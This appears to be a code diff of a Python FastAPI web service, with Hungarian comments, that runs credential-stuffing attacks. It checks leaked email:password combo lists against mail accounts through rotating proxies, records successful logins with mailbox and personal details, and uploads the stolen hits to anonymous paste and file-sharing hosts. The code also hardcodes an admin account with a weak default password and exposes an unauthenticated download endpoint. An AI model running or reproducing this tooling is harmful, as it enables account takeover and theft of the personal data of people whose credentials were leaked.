@@ -7,6 +7,7 @@ from starlette.middleware.cors import CORSMiddleware
 from contextlib import asynccontextmanager
 import asyncio
 import threading
+import time
 import os
 import json
 import requests
@@ -67,7 +68,6 @@ MAX_WORKERS = 40
 # ================================================================
 
 def upload_to_pastebin_fi(content: str) -> str:
-    """Feltöltés pastebin.fi-re"""
     try:
         res = requests.post(
             "https://pastebin.fi/documents",
@@ -88,7 +88,6 @@ def upload_to_pastebin_fi(content: str) -> str:
 
 
 def upload_to_transfer_sh(content: str, filename: str) -> str:
-    """Feltöltés transfer.sh-ra"""
     try:
         res = requests.put(
             f"https://transfer.sh/{filename}",
@@ -106,7 +105,6 @@ def upload_to_transfer_sh(content: str, filename: str) -> str:
 
 
 def upload_to_dpaste(content: str) -> str:
-    """Feltöltés dpaste.org-ra (backup)"""
     try:
         res = requests.post(
             "https://dpaste.org/api/",
@@ -125,7 +123,6 @@ def upload_to_dpaste(content: str) -> str:
 
 
 def upload_to_0x0(content: str, filename: str) -> str:
-    """Feltöltés 0x0.st-re (backup)"""
     try:
         res = requests.post(
             "https://0x0.st",
@@ -142,31 +139,23 @@ def upload_to_0x0(content: str, filename: str) -> str:
 
 
 def upload_results(content: str, filename: str) -> str:
-    """
-    Megpróbálja feltölteni az eredményeket több szolgáltatásra.
-    Az elsőt adja vissza ami sikerül.
-    """
     if not content or len(content.strip()) == 0:
         return None
 
     print(f"  📤 Feltöltés: {filename} ({len(content)} byte)")
 
-    # 1. Pastebin.fi
     url = upload_to_pastebin_fi(content)
     if url:
         return url
 
-    # 2. Transfer.sh
     url = upload_to_transfer_sh(content, filename)
     if url:
         return url
 
-    # 3. Dpaste
     url = upload_to_dpaste(content)
     if url:
         return url
 
-    # 4. 0x0.st
     url = upload_to_0x0(content, filename)
     if url:
         return url
@@ -183,10 +172,8 @@ def upload_results(content: str, filename: str) -> str:
 async def lifespan(app: FastAPI):
     print("\n🔧 Startup...")
 
-    # MongoDB indexek
     await ensure_indexes()
 
-    # Proxy betöltés
     await asyncio.to_thread(proxy_manager.fetch_proxies)
 
     working_count = await asyncio.to_thread(
@@ -200,7 +187,6 @@ async def lifespan(app: FastAPI):
         print(f"🟢 {working_count} proxy kész!")
         print(f"   HTTP: {stats['http']} | SOCKS5: {stats['socks5']} | SOCKS4: {stats['socks4']}")
 
-    # Proxy frissítő loop
     async def proxy_refresh_loop():
         while True:
             await asyncio.sleep(2700)
@@ -209,7 +195,6 @@ async def lifespan(app: FastAPI):
 
     refresh_task = asyncio.create_task(proxy_refresh_loop())
 
-    # Félbemaradt futtatások lezárása
     from pymongo import MongoClient
 
     sync_client = MongoClient(os.getenv("MONGODB_URL"))
@@ -249,7 +234,6 @@ app.add_middleware(
 )
 templates = Jinja2Templates(directory="templates")
 
-# Static mappa létrehozása ha nincs
 os.makedirs("static", exist_ok=True)
 app.mount("/static", StaticFiles(directory="static"), name="static")
 
@@ -259,7 +243,6 @@ app.mount("/static", StaticFiles(directory="static"), name="static")
 # ================================================================
 
 def broadcast_to_user(user_id: str, message: str):
-    """Üzenet küldése a user összes WebSocket kapcsolatára"""
     with ws_lock:
         if user_id not in user_connections:
             return
@@ -311,19 +294,15 @@ async def setup_admin():
     Meglévő usert admin-ra állítja.
     ⚠️ EGYSZER FUTTASD, UTÁNA TÖRÖLD VAGY KOMMENTELD KI!
     """
-    # ⚠️ ÍRD IDE A SAJÁT EMAIL CÍMED!
     admin_email = "xat.king6969@gmail.com"
 
     existing = await get_user_by_email(admin_email)
 
     if not existing:
-        # Ha nincs ilyen user, létrehozzuk
-        from auth import hash_password as hp
-
         await users_collection.insert_one(
             {
                 "email": admin_email,
-                "password": hp("admin123456"),
+                "password": hash_password("admin123456"),
                 "is_admin": True,
                 "invite_code": "SYSTEM_ADMIN",
                 "invite_active": True,
@@ -338,7 +317,6 @@ async def setup_admin():
             "info": "TÖRÖLD EZT AZ ENDPOINTOT ÉS DEPLOY-OLJ ÚJRA!",
         }
 
-    # Meglévő user frissítése admin-ra
     await users_collection.update_one(
         {"email": admin_email},
         {
@@ -367,14 +345,12 @@ async def register(
     password: str = Form(...),
     invite_code: str = Form(...),
 ):
-    """Regisztráció meghívó kóddal"""
     if len(password) < 6:
         raise HTTPException(status_code=400, detail="Minimum 6 karakter jelszó")
 
     if await get_user_by_email(email):
         raise HTTPException(status_code=400, detail="Foglalt email")
 
-    # Meghívó ellenőrzése
     invite = await get_invite_by_code(invite_code)
     if not invite:
         raise HTTPException(status_code=400, detail="Érvénytelen meghívó kód")
@@ -387,10 +363,7 @@ async def register(
     if not invite.get("is_active", True):
         raise HTTPException(status_code=400, detail="Ez a meghívó nem aktív")
 
-    # User létrehozása
     await create_user(email, hash_password(password), invite_code)
-
-    # Meghívó felhasználásának jelzése
     await use_invite(invite_code, email)
 
     return {"token": create_access_token({"sub": email}), "email": email}
@@ -398,12 +371,10 @@ async def register(
 
 @app.post("/api/login")
 async def login(email: str = Form(...), password: str = Form(...)):
-    """Bejelentkezés"""
     user = await get_user_by_email(email)
     if not user or not verify_password(password, user["password"]):
         raise HTTPException(status_code=401, detail="Hibás adatok")
 
-    # Meghívó státusz ellenőrzés
     if not user.get("invite_active", True):
         raise HTTPException(status_code=403, detail="INVITE_REVOKED")
 
@@ -449,7 +420,6 @@ async def start_checker(
     threads: int = Form(MAX_WORKERS),
     current_user=Depends(get_current_user),
 ):
-    """Checker indítása"""
     user_id = str(current_user["_id"])
 
     if await get_active_run(user_id):
@@ -468,17 +438,12 @@ async def start_checker(
             status_code=400, detail="Nincs érvényes email:jelszó sor"
         )
 
-    # Új futtatás létrehozása
     run_id = await create_run(user_id, keyword, len(lines))
-
-    # Régi futtatások törlése (utolsó befejezett marad)
     await cleanup_user_data(user_id, run_id)
 
-    # Stop flag beállítása
     with stop_lock:
         stop_flags[user_id] = asyncio.Event()
 
-    # Checker indítása háttérszálban
     threading.Thread(
         target=lambda: asyncio.run(
             execute_checker(run_id, user_id, lines, keyword, threads)
@@ -496,7 +461,6 @@ async def start_checker(
 
 @app.post("/api/stop")
 async def stop_checker(current_user=Depends(get_current_user)):
-    """Checker leállítása"""
     user_id = str(current_user["_id"])
     with stop_lock:
         if user_id in stop_flags:
@@ -516,11 +480,13 @@ async def execute_checker(
     keyword: str,
     num_threads: int = MAX_WORKERS,
 ):
-    """Checker futtatása háttérben"""
     checked = hits = custom = bad = retries = 0
     total = len(lines)
     stopped = False
     lock = threading.Lock()
+
+    # Threading Event a gyors stop-hoz
+    stop_threading_event = threading.Event()
 
     stats = proxy_manager.get_stats()
     pc = stats["total"]
@@ -532,13 +498,10 @@ async def execute_checker(
 
     broadcast_to_user(
         user_id,
-        json.dumps(
-            {
-                "type": "log",
-                "level": "info",
-                "text": f"[START] {total} combo | {keyword} | {num_threads} szál",
-            }
-        ),
+        json.dumps({
+            "type": "log", "level": "info",
+            "text": f"[START] {total} combo | {keyword} | {num_threads} szál",
+        }),
     )
     broadcast_to_user(
         user_id,
@@ -547,30 +510,46 @@ async def execute_checker(
 
     main_loop = asyncio.get_event_loop()
 
+    def is_stopped():
+        if stop_threading_event.is_set():
+            return True
+        with stop_lock:
+            if user_id in stop_flags and stop_flags[user_id].is_set():
+                stop_threading_event.set()
+                return True
+        return False
+
     def check_single(line):
         nonlocal checked, hits, custom, bad, retries, stopped
 
-        # STOP ELLENŐRZÉS
-        with stop_lock:
-            if user_id in stop_flags and stop_flags[user_id].is_set():
-                stopped = True
-                return
+        # AZONNALI STOP CHECK
+        if is_stopped():
+            stopped = True
+            return
 
         try:
             email, password = line.split(":", 1)
         except Exception:
             return
 
-        result = checker_worker_single(email, password, keyword)
+        # Stop event átadása a checker-nek
+        result = checker_worker_single(email, password, keyword, stop_threading_event)
+
+        # STOP CHECK AZ EREDMÉNY UTÁN
+        if is_stopped():
+            stopped = True
+            return
 
         with lock:
-            # STOP ELLENŐRZÉS ÚJRA
-            with stop_lock:
-                if user_id in stop_flags and stop_flags[user_id].is_set():
-                    stopped = True
-                    return
+            if is_stopped():
+                stopped = True
+                return
 
             checked += 1
+
+            if result["status"] == "stopped":
+                stopped = True
+                return
 
             if result["status"] == "hit":
                 hits += 1
@@ -581,7 +560,6 @@ async def execute_checker(
                     f"Mails={d['mails']} | LastMail={d['date']}"
                 )
 
-                # Eredmény mentése MongoDB-be
                 try:
                     asyncio.run_coroutine_threadsafe(
                         add_result(run_id, user_id, "hit", lt, d), main_loop
@@ -591,9 +569,7 @@ async def execute_checker(
 
                 broadcast_to_user(
                     user_id,
-                    json.dumps(
-                        {"type": "log", "level": "hit", "text": f"[HIT] {lt}"}
-                    ),
+                    json.dumps({"type": "log", "level": "hit", "text": f"[HIT] {lt}"}),
                 )
                 broadcast_to_user(
                     user_id, json.dumps({"type": "live_hit", "data": d})
@@ -607,7 +583,6 @@ async def execute_checker(
                     f"Name={d['name']} | Birthdate={d['birthdate']}"
                 )
 
-                # Eredmény mentése MongoDB-be
                 try:
                     asyncio.run_coroutine_threadsafe(
                         add_result(run_id, user_id, "custom", lt, d), main_loop
@@ -617,13 +592,7 @@ async def execute_checker(
 
                 broadcast_to_user(
                     user_id,
-                    json.dumps(
-                        {
-                            "type": "log",
-                            "level": "custom",
-                            "text": f"[CUSTOM] {lt}",
-                        }
-                    ),
+                    json.dumps({"type": "log", "level": "custom", "text": f"[CUSTOM] {lt}"}),
                 )
                 broadcast_to_user(
                     user_id, json.dumps({"type": "live_custom", "data": d})
@@ -633,115 +602,112 @@ async def execute_checker(
                 bad += 1
                 broadcast_to_user(
                     user_id,
-                    json.dumps(
-                        {"type": "log", "level": "bad", "text": f"[BAD] {email}"}
-                    ),
+                    json.dumps({"type": "log", "level": "bad", "text": f"[BAD] {email}"}),
                 )
 
             else:
                 retries += 1
 
-            # Statisztika frissítés (minden 5. ellenőrzésnél)
             if checked % 5 == 0 or checked == total:
                 try:
                     asyncio.run_coroutine_threadsafe(
-                        update_run_stats(
-                            run_id,
-                            {
-                                "checked": checked,
-                                "hits": hits,
-                                "custom": custom,
-                                "bad": bad,
-                                "retries": retries,
-                            },
-                        ),
+                        update_run_stats(run_id, {
+                            "checked": checked, "hits": hits,
+                            "custom": custom, "bad": bad, "retries": retries,
+                        }),
                         main_loop,
                     )
                 except Exception:
                     pass
 
-            # Live statisztika küldése
             broadcast_to_user(
                 user_id,
-                json.dumps(
-                    {
-                        "type": "stats",
-                        "run_id": run_id,
-                        "checked": checked,
-                        "hits": hits,
-                        "custom": custom,
-                        "bad": bad,
-                        "retries": retries,
-                        "total": total,
-                    }
-                ),
+                json.dumps({
+                    "type": "stats", "run_id": run_id,
+                    "checked": checked, "hits": hits,
+                    "custom": custom, "bad": bad,
+                    "retries": retries, "total": total,
+                }),
             )
 
     def run_parallel():
-        """Párhuzamos futtatás ThreadPoolExecutor-ral"""
+        nonlocal stopped
+
         with ThreadPoolExecutor(max_workers=num_threads) as executor:
             futures = []
+
             for line in lines:
-                # Stop ellenőrzés új feladat indítása előtt
-                with stop_lock:
-                    if user_id in stop_flags and stop_flags[user_id].is_set():
-                        break
+                if is_stopped():
+                    stopped = True
+                    break
                 futures.append(executor.submit(check_single, line))
 
+            done_count = 0
             for future in as_completed(futures):
-                # Stop ellenőrzés eredmény feldolgozásnál
-                with stop_lock:
-                    if user_id in stop_flags and stop_flags[user_id].is_set():
-                        break
+                done_count += 1
+
+                if is_stopped():
+                    stopped = True
+                    stop_threading_event.set()
+                    break
+
                 try:
                     future.result()
                 except Exception:
                     pass
 
+            if stopped:
+                for f in futures:
+                    f.cancel()
+
+    # Stop flag figyelő háttérszál
+    def stop_watcher():
+        while not stop_threading_event.is_set():
+            with stop_lock:
+                if user_id in stop_flags and stop_flags[user_id].is_set():
+                    stop_threading_event.set()
+                    print(f"⏹️ Stop jelzés észlelve! (User: {user_id})")
+                    return
+            time.sleep(0.1)
+
+    watcher = threading.Thread(target=stop_watcher, daemon=True)
+    watcher.start()
+
     # Futtatás
     await asyncio.to_thread(run_parallel)
 
-    # Végső statisztika mentése
-    await update_run_stats(
-        run_id,
-        {
-            "checked": checked,
-            "hits": hits,
-            "custom": custom,
-            "bad": bad,
-            "retries": retries,
-        },
-    )
+    # Stop figyelő leállítása
+    stop_threading_event.set()
+    watcher.join(timeout=2)
 
-    # ==================== FELTÖLTÉS KÜLSŐ SZOLGÁLTATÁSRA ====================
+    # Végső statisztika mentése
+    await update_run_stats(run_id, {
+        "checked": checked, "hits": hits, "custom": custom,
+        "bad": bad, "retries": retries,
+    })
+
+    # ==================== FELTÖLTÉS ====================
     hits_url = None
     custom_url = None
 
     if hits > 0 or custom > 0:
         broadcast_to_user(
             user_id,
-            json.dumps(
-                {
-                    "type": "log",
-                    "level": "info",
-                    "text": "📤 Eredmények feltöltése külső szerverre...",
-                }
-            ),
+            json.dumps({
+                "type": "log", "level": "info",
+                "text": "📤 Eredmények feltöltése külső szerverre...",
+            }),
         )
 
-        # HITS feltöltés
         if hits > 0:
             hit_lines = await get_run_result_lines(run_id, "hit")
             if hit_lines:
                 broadcast_to_user(
                     user_id,
-                    json.dumps(
-                        {
-                            "type": "log",
-                            "level": "info",
-                            "text": f"📤 {len(hit_lines)} HIT feltöltése...",
-                        }
-                    ),
+                    json.dumps({
+                        "type": "log", "level": "info",
+                        "text": f"📤 {len(hit_lines)} HIT feltöltése...",
+                    }),
                 )
                 hits_url = await asyncio.to_thread(
                     upload_results,
@@ -751,39 +717,29 @@ async def execute_checker(
                 if hits_url:
                     broadcast_to_user(
                         user_id,
-                        json.dumps(
-                            {
-                                "type": "log",
-                                "level": "hit",
-                                "text": f"✅ Hits feltöltve!",
-                            }
-                        ),
+                        json.dumps({
+                            "type": "log", "level": "hit",
+                            "text": "✅ Hits feltöltve!",
+                        }),
                     )
                 else:
                     broadcast_to_user(
                         user_id,
-                        json.dumps(
-                            {
-                                "type": "log",
-                                "level": "bad",
-                                "text": "❌ Hits feltöltés sikertelen - DB-ből letölthető",
-                            }
-                        ),
+                        json.dumps({
+                            "type": "log", "level": "bad",
+                            "text": "❌ Hits feltöltés sikertelen - DB-ből letölthető",
+                        }),
                     )
 
-        # CUSTOM feltöltés
         if custom > 0:
             custom_lines = await get_run_result_lines(run_id, "custom")
             if custom_lines:
                 broadcast_to_user(
                     user_id,
-                    json.dumps(
-                        {
-                            "type": "log",
-                            "level": "info",
-                            "text": f"📤 {len(custom_lines)} CUSTOM feltöltése...",
-                        }
-                    ),
+                    json.dumps({
+                        "type": "log", "level": "info",
+                        "text": f"📤 {len(custom_lines)} CUSTOM feltöltése...",
+                    }),
                 )
                 custom_url = await asyncio.to_thread(
                     upload_results,
@@ -793,24 +749,18 @@ async def execute_checker(
                 if custom_url:
                     broadcast_to_user(
                         user_id,
-                        json.dumps(
-                            {
-                                "type": "log",
-                                "level": "custom",
-                                "text": f"✅ Custom feltöltve!",
-                            }
-                        ),
+                        json.dumps({
+                            "type": "log", "level": "custom",
+                            "text": "✅ Custom feltöltve!",
+                        }),
                     )
                 else:
                     broadcast_to_user(
                         user_id,
-                        json.dumps(
-                            {
-                                "type": "log",
-                                "level": "bad",
-                                "text": "❌ Custom feltöltés sikertelen - DB-ből letölthető",
-                            }
-                        ),
+                        json.dumps({
+                            "type": "log", "level": "bad",
+                            "text": "❌ Custom feltöltés sikertelen - DB-ből letölthető",
+                        }),
                     )
 
     # Futtatás befejezése
@@ -825,29 +775,19 @@ async def execute_checker(
 
     broadcast_to_user(
         user_id,
-        json.dumps(
-            {
-                "type": "log",
-                "level": "finish",
-                "text": f"[{st_text}] Hits: {hits} | Custom: {custom} | Bad: {bad}",
-            }
-        ),
+        json.dumps({
+            "type": "log", "level": "finish",
+            "text": f"[{st_text}] Hits: {hits} | Custom: {custom} | Bad: {bad}",
+        }),
     )
 
-    # Letöltési linkek küldése a frontendnek
     broadcast_to_user(
         user_id,
-        json.dumps(
-            {
-                "type": "finished",
-                "run_id": run_id,
-                "hits_url": hits_url,
-                "custom_url": custom_url,
-                "hits_count": hits,
-                "custom_count": custom,
-                "bad_count": bad,
-            }
-        ),
+        json.dumps({
+            "type": "finished", "run_id": run_id,
+            "hits_url": hits_url, "custom_url": custom_url,
+            "hits_count": hits, "custom_count": custom, "bad_count": bad,
+        }),
     )
 
     # Stop flag törlése
@@ -862,7 +802,6 @@ async def execute_checker(
 
 @app.get("/api/runs")
 async def get_user_runs_list(current_user=Depends(get_current_user)):
-    """Befejezett futtatások listája"""
     runs = await get_user_finished_runs(str(current_user["_id"]))
     for r in runs:
         r["_id"] = str(r["_id"])
@@ -878,18 +817,15 @@ async def get_download_url(
     type: str,
     current_user=Depends(get_current_user),
 ):
-    """Letöltési URL lekérése"""
     run = await get_run(run_id)
     if not run or run["user_id"] != str(current_user["_id"]):
         raise HTTPException(status_code=404)
 
-    # Külső URL ellenőrzés
     if type == "hits" and run.get("hits_url"):
         return {"url": run["hits_url"], "source": "external"}
     if type == "custom" and run.get("custom_url"):
         return {"url": run["custom_url"], "source": "external"}
 
-    # Fallback: DB-ből
     result_count = await get_result_count(run_id, "hit" if type == "hits" else "custom")
     if result_count > 0:
         return {"url": f"/api/download_direct/{run_id}/{type}", "source": "local"}
@@ -899,7 +835,6 @@ async def get_download_url(
 
 @app.get("/api/download_direct/{run_id}/{type}")
 async def download_direct(run_id: str, type: str):
-    """Közvetlen letöltés DB-ből (fallback)"""
     run = await get_run(run_id)
     if not run:
         raise HTTPException(status_code=404)
@@ -921,7 +856,6 @@ async def download_direct(run_id: str, type: str):
 
 @app.get("/api/admin/invites")
 async def get_invites(admin_user=Depends(get_admin_user)):
-    """Összes meghívó listázása"""
     invites = await get_all_invites()
     for inv in invites:
         inv["_id"] = str(inv["_id"])
@@ -933,7 +867,6 @@ async def get_invites(admin_user=Depends(get_admin_user)):
 
 @app.post("/api/admin/invites/create")
 async def create_new_invite(admin_user=Depends(get_admin_user)):
-    """Új meghívó létrehozása"""
     invite = await create_invite(admin_user["email"])
     invite["_id"] = str(invite["_id"])
     invite["created_at"] = invite["created_at"].isoformat()
@@ -945,24 +878,18 @@ async def delete_invite_endpoint(
     invite_code: str,
     admin_user=Depends(get_admin_user),
 ):
-    """Meghívó törlése és kapcsolódó userek letiltása"""
-    # Userek letiltása
     await revoke_users_by_invite(invite_code)
-
-    # Meghívó törlése
     await delete_invite(invite_code)
-
     return {"status": "deleted", "code": invite_code}
 
 
 @app.get("/api/admin/users")
 async def get_users(admin_user=Depends(get_admin_user)):
-    """Összes user listázása"""
     users = await get_all_users()
     for user in users:
         user["_id"] = str(user["_id"])
         user["created_at"] = user["created_at"].isoformat()
-        del user["password"]  # Jelszó ne jelenjen meg
+        del user["password"]
     return users
 
 
@@ -971,7 +898,6 @@ async def toggle_user_status(
     email: str,
     admin_user=Depends(get_admin_user),
 ):
-    """User engedélyezése/letiltása"""
     user = await get_user_by_email(email)
     if not user:
         raise HTTPException(status_code=404, detail="User not found")
@@ -1018,39 +944,35 @@ async def websocket_endpoint(websocket: WebSocket, token: str = ""):
             user_connections[user_id] = []
         user_connections[user_id].append(ws_info)
 
-    # Proxy info küldése
+    # Proxy info
     try:
         stats = proxy_manager.get_stats()
         await websocket.send_text(
-            json.dumps(
-                {
-                    "type": "proxy_info",
-                    "count": stats["total"],
-                    "http": stats["http"],
-                    "socks4": stats["socks4"],
-                    "socks5": stats["socks5"],
-                    "tested": proxy_manager.is_tested(),
-                }
-            )
+            json.dumps({
+                "type": "proxy_info",
+                "count": stats["total"],
+                "http": stats["http"],
+                "socks4": stats["socks4"],
+                "socks5": stats["socks5"],
+                "tested": proxy_manager.is_tested(),
+            })
         )
     except Exception:
         pass
 
-    # User info küldése (admin státusz)
+    # User info (admin státusz)
     try:
         await websocket.send_text(
-            json.dumps(
-                {
-                    "type": "user_info",
-                    "is_admin": user.get("is_admin", False),
-                    "email": user.get("email", ""),
-                }
-            )
+            json.dumps({
+                "type": "user_info",
+                "is_admin": user.get("is_admin", False),
+                "email": user.get("email", ""),
+            })
         )
     except Exception:
         pass
 
-    # Aktív futtatás info
+    # Aktív futtatás
     active_run = await get_active_run(user_id)
     if active_run:
         active_run["_id"] = str(active_run["_id"])
@@ -1059,17 +981,12 @@ async def websocket_endpoint(websocket: WebSocket, token: str = ""):
             await websocket.send_text(
                 json.dumps({"type": "active_run", "run": active_run})
             )
-            # Korábbi eredmények küldése
-            hit_details = await get_run_result_details(
-                active_run["_id"], "hit"
-            )
+            hit_details = await get_run_result_details(active_run["_id"], "hit")
             for hit in hit_details:
                 await websocket.send_text(
                     json.dumps({"type": "live_hit", "data": hit})
                 )
-            custom_details = await get_run_result_details(
-                active_run["_id"], "custom"
-            )
+            custom_details = await get_run_result_details(active_run["_id"], "custom")
             for c in custom_details:
                 await websocket.send_text(
                     json.dumps({"type": "live_custom", "data": c})
@@ -1077,35 +994,31 @@ async def websocket_endpoint(websocket: WebSocket, token: str = ""):
         except Exception:
             pass
 
-    # Előző befejezett futtatás eredményei
+    # Előző befejezett futtatás
     finished_runs = await get_user_finished_runs(user_id)
     for run in finished_runs:
         if run.get("hits_url") or run.get("custom_url"):
             try:
                 finished_at = run.get("finished_at")
                 await websocket.send_text(
-                    json.dumps(
-                        {
-                            "type": "previous_results",
-                            "run_id": str(run["_id"]),
-                            "hits_url": run.get("hits_url"),
-                            "custom_url": run.get("custom_url"),
-                            "hits": run.get("hits", 0),
-                            "custom": run.get("custom", 0),
-                            "bad": run.get("bad", 0),
-                            "checked": run.get("checked", 0),
-                            "total": run.get("total", 0),
-                            "keyword": run.get("keyword", ""),
-                            "finished_at": finished_at.isoformat()
-                            if finished_at
-                            else None,
-                        }
-                    )
+                    json.dumps({
+                        "type": "previous_results",
+                        "run_id": str(run["_id"]),
+                        "hits_url": run.get("hits_url"),
+                        "custom_url": run.get("custom_url"),
+                        "hits": run.get("hits", 0),
+                        "custom": run.get("custom", 0),
+                        "bad": run.get("bad", 0),
+                        "checked": run.get("checked", 0),
+                        "total": run.get("total", 0),
+                        "keyword": run.get("keyword", ""),
+                        "finished_at": finished_at.isoformat() if finished_at else None,
+                    })
                 )
             except Exception:
                 pass
 
-    # WebSocket üzenetek fogadása (ping/pong)
+    # Ping/pong loop
     try:
         while True:
             data = await websocket.receive_text()
@@ -1113,10 +1026,7 @@ async def websocket_endpoint(websocket: WebSocket, token: str = ""):
                 await websocket.send_text("pong")
     except (WebSocketDisconnect, RuntimeError, Exception):
         with ws_lock:
-            if (
-                user_id in user_connections
-                and ws_info in user_connections[user_id]
-            ):
+            if user_id in user_connections and ws_info in user_connections[user_id]:
                 user_connections[user_id].remove(ws_info)
                 if not user_connections[user_id]:
                     del user_connections[user_id]
